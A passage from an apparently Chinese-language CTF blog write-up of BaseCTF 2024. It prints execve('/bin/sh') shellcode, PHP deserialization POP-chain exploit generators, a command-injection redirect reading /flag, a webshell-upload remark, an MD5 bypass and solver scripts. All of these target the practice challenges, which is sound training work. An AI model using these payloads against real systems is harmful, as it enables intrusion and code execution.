&quot;/bin//sh&quot;</span><br>    <span class="hljs-string">b&quot;\x48\x31\xf6&quot;</span>            <span class="hljs-comment"># xor rsi, rsi        ; 清空 rsi 寄存器 (rsi = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xd2&quot;</span>            <span class="hljs-comment"># xor rdx, rdx        ; 清空 rdx 寄存器 (rdx = 0)，表示 NULL</span><br>    <span class="hljs-string">b&quot;\x48\x31\xc0&quot;</span>            <span class="hljs-comment"># xor rax, rax        ; 清空 rax 寄存器 (rax = 0)</span><br>    <span class="hljs-string">b&quot;\xb0\x3b&quot;</span>                <span class="hljs-comment"># mov al, 0x3b        ; 将 0x3b (59) 赋给 al 寄存器，59 是 execve 的系统调用号</span><br>    <span class="hljs-string">b&quot;\x0f\x05&quot;</span>                <span class="hljs-comment"># syscall             ; 触发系统调用，执行 execve(&quot;/bin/sh&quot;, NULL, NULL)</span><br>)<br><br>p.sendline(shellcode)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> web</h2><h3 id="http-是什么呀"><a class="markdownIt-Anchor" href="#http-是什么呀"></a> HTTP 是什么呀</h3><p>?basectf=we1c%2500me</p><p>Base=fl@g</p><p><img src="../../images/basectf/basectf2024/http1.png" alt="http1"></p><p><img src="../../images/basectf/basectf2024/http2.png" alt="http2"></p><p><img src="../../images/basectf/basectf2024/http3.png" alt="http3"></p><p>base解密得到flag</p><h3 id="喵喵喵-́ع"><a class="markdownIt-Anchor" href="#喵喵喵-́ع"></a> 喵喵喵´•ﻌ•`</h3><p><img src="/../../images/basectf/basectf2024/%E5%96%B5%E5%96%B5%E5%96%B5.png" alt="喵喵喵"></p><h3 id="md5绕过欸"><a class="markdownIt-Anchor" href="#md5绕过欸"></a> md5绕过欸</h3><p><img src="/../../images/basectf/basectf2024/md5.png" alt="md5"></p><h3 id="a-dark-room"><a class="markdownIt-Anchor" href="#a-dark-room"></a> A Dark Room</h3><p>直接查看源码得到flag</p><h3 id="upload"><a class="markdownIt-Anchor" href="#upload"></a> upload</h3><p>上传一句话木马，观看源码在uploads/，直接上传php即可</p><h3 id="aura-酱的礼物"><a class="markdownIt-Anchor" href="#aura-酱的礼物"></a> Aura 酱的礼物</h3><p>混了个二血😋</p><p>前两个一个是php伪协议，一个直接输入</p><p>第三个</p><p>我是用的是@进行重定向，然后用我自己的vps开个端口进行拼接就行（理论上不需要这么复杂，只是最先想到这个办法</p><p><img src="/../../images/basectf/basectf2024/aura.png" alt="aura"></p><p>最后进行伪协议读取flag</p><p>// flag{c985afc7-50f1-44e5-87f0-221d081b9459}  Aura 酱有拿到一血吗？</p><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="你也喜欢圣物吗"><a class="markdownIt-Anchor" href="#你也喜欢圣物吗"></a> 你也喜欢圣物吗</h3><p>打开下来先用010打开图片看，底部有个base64的编码</p><p>提示去看LSB</p><p>利用stegsolve进行分析，得到key</p><p>解开第一层压缩包</p><p>第二层伪加密工具进行解密，打开进去滑到下面有个真的flag</p><h3 id="根本进不去啊"><a class="markdownIt-Anchor" href="#根本进不去啊"></a> 根本进不去啊!</h3><p><img src="/../../images/basectf/basectf2024/%E8%BF%9B%E4%B8%8D%E5%8E%BB.png" alt="进不去"></p><p>dig的命令是进行域信息搜索器，找txt得到flag</p><h3 id="海上遇到了鲨鱼"><a class="markdownIt-Anchor" href="#海上遇到了鲨鱼"></a> 海上遇到了鲨鱼</h3><p>利用wireshark打开，http找到php,里面有flag,进行简单的反转得到flag</p><h3 id="正着看还是反着看呢"><a class="markdownIt-Anchor" href="#正着看还是反着看呢"></a> 正着看还是反着看呢？</h3><p>利用python读取图片文件，然后反转图片进行逆向</p><p>将文件拖到虚拟机，进行foremost，里面有压缩包解压得到flag</p><h3 id="base"><a class="markdownIt-Anchor" href="#base"></a> Base</h3><p>直接64，32进行解密</p><h3 id="签到dk-盾"><a class="markdownIt-Anchor" href="#签到dk-盾"></a> 签到！DK 盾！</h3><p>直接公众号发送就行</p><h3 id="人生苦短我用python"><a class="markdownIt-Anchor" href="#人生苦短我用python"></a> 人生苦短，我用Python</h3><p>其他部分都可以看着推，我这边放一下<strong>推算15</strong>的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#得到flagimport itertools</span><br><br><span class="hljs-comment"># 目标值</span><br>target_value = <span class="hljs-number">41378751114180610</span><br><br><span class="hljs-comment"># 我们已知的 flag 结构</span><br>flag = <span class="hljs-string">&#x27;BaseCTF&#123;s1Mpl3_1s_l1Tt3r_Th4n_C0mPl3x&#125;&#x27;</span><br><br><span class="hljs-comment"># 定义我们将尝试的字符集</span><br>charset = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&#x27;</span><br><br><span class="hljs-comment"># 计算函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calculate_sum</span>(<span class="hljs-params">chars</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">ord</span>(c) * <span class="hljs-number">2024_08_15</span> ** idx <span class="hljs-keyword">for</span> idx, c <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(chars))<br><br><span class="hljs-comment"># 生成所有可能的组合并测试</span><br><span class="hljs-keyword">for</span> combo <span class="hljs-keyword">in</span> itertools.product(charset, repeat=<span class="hljs-number">3</span>):<br>    candidate = <span class="hljs-string">&#x27;&#x27;</span>.join(combo)<br>    <span class="hljs-keyword">if</span> calculate_sum(candidate) == target_value:<br>        <span class="hljs-comment"># 找到符合条件的组合，更新 flag</span><br>        flag = flag[:<span class="hljs-number">17</span>] + candidate + flag[<span class="hljs-number">20</span>:]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found correct sequence: <span class="hljs-subst">&#123;candidate&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Correct flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No valid sequence found.&quot;</span>)<br><span class="hljs-comment">#BaseCTF&#123;s1Mpl3_1s_BeTt3r_Th4n_C0mPl3x&#125;</span><br></code></pre></td></tr></table></figure><h3 id="倒计时海报"><a class="markdownIt-Anchor" href="#倒计时海报"></a> 倒计时？海报！</h3><p>配合stegsolve即可正确食用，一开始一直没写听说废眼，真正做的话十分钟以内估计就解决了附上各个对应的截图</p><img src="/../../images/basectf/basectf2024/haibao1.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao2.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao3.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao4.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao5.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao6.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao7.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao8.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao9.png" alt="haibao1" style="zoom: 50%;"><img src="/../../images/basectf/basectf2024/haibao10.png" alt="haibao1" style="zoom: 50%;"><p><strong>BaseCTF{c0unt_d0wn_fro3_X_every_d@y_i5_re@11y_c0o1_@nd_h@rd_t0_do_1t_ev3ry_n1ght}</strong></p><h3 id="喵喵太可爱了"><a class="markdownIt-Anchor" href="#喵喵太可爱了"></a> 喵喵太可爱了</h3><p>跟着幸运儿拿的flag</p><p><strong>BaseCTF{m1a0_mi@o_1s_n0t_a_b3tr4yer_t0_t3l1_the_f1ag}</strong></p><h1 id="week2以后只写web了orz"><a class="markdownIt-Anchor" href="#week2以后只写web了orz"></a> week2(以后只写web了，orz)</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id="ez_ser"><a class="markdownIt-Anchor" href="#ez_ser"></a> ez_ser</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">re</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$chu0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;chu0))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;I can not believes!&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;chu0-&gt;<span class="hljs-variable">$nononono</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">web</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$kw</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dt</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;lalalla&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;kw;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ALL Done!&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">pwn</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dusk</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$over</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;dusk != <span class="hljs-string">&quot;gods&quot;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;什么，你竟敢不认可?&quot;</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;over-&gt;<span class="hljs-title function_ invoke__">getflag</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$nothing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy happy happy!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getflag</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are over!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ser&#x27;</span>];<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> web;<br><span class="hljs-variable">$exp</span>-&gt;kw = <span class="hljs-keyword">new</span> re;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0 = <span class="hljs-keyword">new</span> pwn;<br><span class="hljs-variable">$exp</span>-&gt;kw-&gt;chu0-&gt;over = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Misc</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="一起吃豆豆"><a class="markdownIt-Anchor" href="#一起吃豆豆"></a> 一起吃豆豆</h3><p>不能直接f12，可以用浏览器的开发者工具打开f12，看js代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">context.<span class="hljs-title function_">fillText</span>(_LIFE ? <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;QmFzZUNURntKNV9nYW0zXzFzX2Vhc3lfdDBfaDRjayEhfQ==&quot;</span>) : <span class="hljs-string">&#x27;GAME OVER&#x27;</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">x</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">y</span>);<br></code></pre></td></tr></table></figure><p>base64解一下就出来了</p><h3 id="happy-birthday"><a class="markdownIt-Anchor" href="#happy-birthday"></a> Happy Birthday</h3><p>尝试了一下发现要传pdf格式并且需要文件相同，可以参考我php绕过那篇文章，利用fastcoll.exe生成两个文件，得到flag</p><h3 id="你听不到我的声音"><a class="markdownIt-Anchor" href="#你听不到我的声音"></a> 你听不到我的声音</h3><p>这题考察的是这个函数没有直接的回显，可以重定向，利用&gt;得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=<span class="hljs-built_in">cat</span> /flag&gt;1.txt<br></code></pre></td></tr></table></figure><h3 id="really-ez-pop"><a class="markdownIt-Anchor" href="#really-ez-pop"></a> Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>;<br><span class="hljs-variable">$exp</span>-&gt;sea-&gt;see = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>));<br></code></pre></td></tr></table></figure><h3 id="rceisamazingwithspace"><a class="markdownIt-Anchor" href="#rceisamazingwithspace"></a> RCEisamazingwithspace</h3><p>过滤了空格，用常见的空格绕过就行</p><p>网上搜搜就行了，没什么好说的</p><h3 id="数学大师"><a class="markdownIt-Anchor" href="#数学大师"></a> 数学大师</h3><p>本体唯一的写脚本难度就是代码逻辑问题，本人写错的原因就是因为post了两次导致一直重复发包始终分数为1，就直接上exp了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:29992/&#x27;</span><br>session = requests.Session()<br>session.cookies.<span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>, <span class="hljs-string">&#x27;7ovv17kbkuh5f6pr1d2tbk07qt&#x27;</span>)<br>response = session.post(url)<br>math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, response.text)<br>math = math.group(<span class="hljs-number">1</span>).strip()<br>math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>answer = <span class="hljs-built_in">eval</span>(math)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">51</span>):<br>    post_data = &#123;<span class="hljs-string">&#x27;answer&#x27;</span>: answer&#125;<br>    post_response = session.post(url, data=post_data)<br>    math = re.search(<span class="hljs-string">r&#x27;second (\d+.+?)\?&#x27;</span>, post_response.text)<br>    math = math.group(<span class="hljs-number">1</span>).strip()<br>    math = math.replace(<span class="hljs-string">&#x27;÷&#x27;</span>, <span class="hljs-string">&#x27;//&#x27;</span>).replace(<span class="hljs-string">&#x27;×&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>)<br>    answer = <span class="hljs-built_in">eval</span>(math)<br>    <span class="hljs-built_in">print</span>(post_response.text)<br></code></pre></td></tr></table></figure><h3 id="所以你说你懂-md5"><a class="markdownIt-Anchor" href="#所以你说你懂-md5"></a> 所以你说你懂 MD5?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">// 所以你说你懂 MD5 了?</span><br><br><span class="hljs-variable">$apple</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;banana&#x27;</span>];<br><span class="hljs-keyword">if</span> (!(<span class="hljs-variable">$apple</span> !== <span class="hljs-variable">$banana</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$apple</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$banana</span>))) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;加强难度就不会了?&#x27;</span>);<br>&#125;<br><br><span class="hljs-comment">// 什么? 你绕过去了?</span><br><span class="hljs-comment">// 加大剂量!</span><br><span class="hljs-comment">// 我要让他成为 string</span><br><span class="hljs-variable">$apple</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;appple&#x27;</span>];<br><span class="hljs-variable">$banana</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span 